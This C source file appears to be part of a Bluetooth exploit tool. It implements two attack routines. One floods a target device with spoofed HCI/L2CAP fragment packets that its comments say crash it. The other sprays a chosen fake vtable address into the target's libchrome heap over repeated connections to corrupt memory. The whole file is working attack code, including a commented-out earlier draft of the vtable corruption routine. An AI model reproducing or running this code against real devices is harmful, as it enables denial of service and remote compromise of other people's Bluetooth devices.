#include "smash.h"

#include "log.h"
#include "bluetooth.h"

#include <stdlib.h>
#include <unistd.h>

#include <time.h>

// #define SMASH_CONNECTION_COUNT (16)
// #define SMASH_CONNECTION_COUNT (2)
// #define SMASH_PACKET_COUNT (128)
#define SMASH_CRASH_PACKET_COUNT ((size_t)32)
#define SMASH_CRASH_PACKET_DELAY (50)

#define SMASH_CONNECTION_COUNT ((size_t)5)
// #define SMASH_PACKET_COUNT ((size_t)64)
#define SMASH_PACKET_COUNT ((size_t)96)
#define SMASH_PACKET_DELAY (75)

err_t smash_crash_target(bdaddr_t bdaddr, uint8_t *const packet_id)
{
    if (packet_id == NULL)
        ERR_RET("NULL_PACKET_ID", "Parameter packet_id cannot be NULL");

    int hci_sock_fd, l2cap_sock_fd;
    uint16_t hci_handle;

    ERR_FWD(bluetooth_connect(bdaddr, true, true, &hci_sock_fd, &l2cap_sock_fd, &hci_handle));
    
    uint8_t buffer[1024];
    memset(buffer, 'C', 1024);

    for (size_t i = 0; i < SMASH_CRASH_PACKET_COUNT; i++)
    {
        size_t packet_size = 140; // This crashes the target, so we'll stick with it

        LOGL_CLEAR()
        LOGL_INFO("Sending crash packet %zu/%zu...", i + 1, SMASH_CRASH_PACKET_COUNT)

        // uint8_t chosen_packet_id = *packet_id;

        ERR_FWD_CLEANUP(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 2, false, buffer, packet_size),
                        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)
        ERR_FWD_CLEANUP(bluetooth_inc_packet_id(packet_id),
                        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)
        ERR_FWD_CLEANUP(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, buffer, packet_size),
                        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)
        ERR_FWD_CLEANUP(bluetooth_inc_packet_id(packet_id),
                        bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)

        struct timespec ts =
            {
                .tv_sec = 0,
                .tv_nsec = SMASH_CRASH_PACKET_DELAY * 1000 * 1000};
        nanosleep(&ts, NULL);

        // struct bluetooth_l2cap_header *packet = NULL;
        // ERR_FWD_CLEANUP(bluetooth_l2cap_recv_packet_id(l2cap_sock_fd, &packet, chosen_packet_id),
        //                 bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle););
        // free(packet);
        // packet = NULL;
    }

    LOGL_CLEAR()
    LOGL_SUCCESS("Sent a total of %zu crash packets\n", SMASH_CRASH_PACKET_COUNT)

    ERR_FWD(bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle));

    return NULL;
}

// err_t smash_corrupt_libchrome_vtable(const int hci_sock_fd, const uint16_t hci_handle, const int l2cap_sock_fd, uint8_t *const packet_id, uint64_t fake_vtable_address)
// {
//     if (packet_id == NULL)
//         ERR_RET("NULL_PACKET_ID", "Parameter packet_id cannot be NULL");

//     uint8_t buffer[128] = {0};
//     {
//         size_t i = 0                                                                                // We are now at partial_packet[handle]->data + 3
//                    + sizeof(uint64_t) - 3                                                           // We are now at partial_packet[handle]->data + sizeof(uint64_t)
//                    + sizeof(uint64_t) - (sizeof(struct bluetooth_remote_header) % sizeof(uint64_t)) // We are now at partial_packet[handle] + (some multiple of sizeof(uint64_t))
//             ;

//         for (; i < sizeof(buffer); i += sizeof(uint64_t))
//             *(uint64_t *)(buffer + i) = fake_vtable_address;
//     }

//     for (size_t i = 0; i < 128; i++)
//     {
//         LOGL_DBG_VAR(i, "%zu");
//         ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 2, false, (uint8_t *)buffer, 3))
//         ERR_FWD(bluetooth_inc_packet_id(packet_id))
//         ERR_FWD(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, (uint8_t *)buffer, sizeof(buffer)))
//         ERR_FWD(bluetooth_inc_packet_id(packet_id))

//         struct timespec ts =
//             {
//                 .tv_sec = 0,
//                 .tv_nsec = 50 * 1000 * 1000 // 100 ms
//             };
//         nanosleep(&ts, NULL);
//     }

//     return NULL;
// }

err_t smash_corrupt_libchrome_vtable(const bdaddr_t bdaddr, uint8_t *const packet_id, uint64_t fake_vtable_address)
{
    if (packet_id == NULL)
        ERR_RET("NULL_PACKET_ID", "Parameter packet_id cannot be NULL");

    LOGL_INFO("Attempting to corrupt libchrome vtable to point to 0x%016" PRIx64 "\n", fake_vtable_address);

    // bluetooth_restart();

    uint8_t buffer[128] = {0};
    {
        size_t i = 0                                                                                // We are now at partial_packet[handle]->data + 3
                   + sizeof(uint64_t) - 3                                                           // We are now at partial_packet[handle]->data + sizeof(uint64_t)
                   + sizeof(uint64_t) - (sizeof(struct bluetooth_remote_header) % sizeof(uint64_t)) // We are now at partial_packet[handle] + (some multiple of sizeof(uint64_t))
            ;

        for (; i < sizeof(buffer); i += sizeof(uint64_t))
            *(uint64_t *)(buffer + i) = fake_vtable_address;
    }

    int hci_sock_fd, l2cap_sock_fd;
    uint16_t hci_handle;
    for (size_t i = 0; i < SMASH_CONNECTION_COUNT; i++)
    {
        err_t err = bluetooth_connect(bdaddr, true, true, &hci_sock_fd, &l2cap_sock_fd, &hci_handle);
        if (err && err_root(err)->error_no == ETIMEDOUT)
        {
            LOG_INFO("\n")
            err_print_free(err);
            LOGL_WARNING("We received an ETIMEDOUT, which probably means that the target crashed - Stopping...\n")
            break;
        }

        for (size_t j = 0; j < SMASH_PACKET_COUNT; j++)
        {
            LOGL_CLEAR()
            LOGL_INFO("Sending smash packet %zu.%zu/%zu.%zu...", i + 1, j + 1, SMASH_CONNECTION_COUNT, SMASH_PACKET_COUNT)

            ERR_FWD_CLEANUP(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 2, false, (uint8_t *)buffer, 3),
                            bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)
            ERR_FWD_CLEANUP(bluetooth_inc_packet_id(packet_id),
                            bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)
            ERR_FWD_CLEANUP(bluetooth_hci_packet_spoof_send(hci_sock_fd, hci_handle, *packet_id, 0, true, (uint8_t *)buffer, sizeof(buffer)),
                            bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)
            ERR_FWD_CLEANUP(bluetooth_inc_packet_id(packet_id),
                            bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle);)

            struct timespec ts =
                {
                    .tv_sec = 0,
                    .tv_nsec = SMASH_PACKET_DELAY * 1000 * 1000 // 100 ms
                };
            nanosleep(&ts, NULL);
        }

        // sleep(4);
        // ERR_FWD(bluetooth_l2cap_close(l2cap_sock_fd))
        // ERR_FWD(bluetooth_hci_close(hci_sock_fd))
        ERR_FWD(bluetooth_disconnect(hci_sock_fd, l2cap_sock_fd, hci_handle));
    }

    LOGL_CLEAR()
    LOGL_SUCCESS("Sent a total of %zu smash packets\n", SMASH_CONNECTION_COUNT * SMASH_PACKET_COUNT)

    // ERR_FWD(bluetooth_hci_set_ssp_mode(false));
    return NULL;
}